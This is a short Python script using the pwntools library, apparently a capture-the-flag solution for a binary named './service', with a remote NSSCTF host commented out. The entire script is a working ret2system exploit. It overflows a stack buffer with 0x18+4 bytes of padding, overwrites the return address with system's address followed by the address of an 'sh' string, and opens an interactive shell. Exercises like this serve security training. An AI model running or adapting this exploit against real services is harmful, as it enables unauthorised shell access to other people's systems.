from pwn import *

context.gdb_binary = "/bin/pwndbg"
buf_addr = 0xffa7be70
system_addr = 0x8048529
io = process("./service")
#io = remote("node5.anna.nssctf.cn", 22083)
elf = ELF("./service")
sh_addr = next(elf.search(b'sh\x00'))

payload = b"a" * (0x18+4) + p32(system_addr) + p32(sh_addr)
#gdb.attach(io)
io.send(payload)
io.interactive()


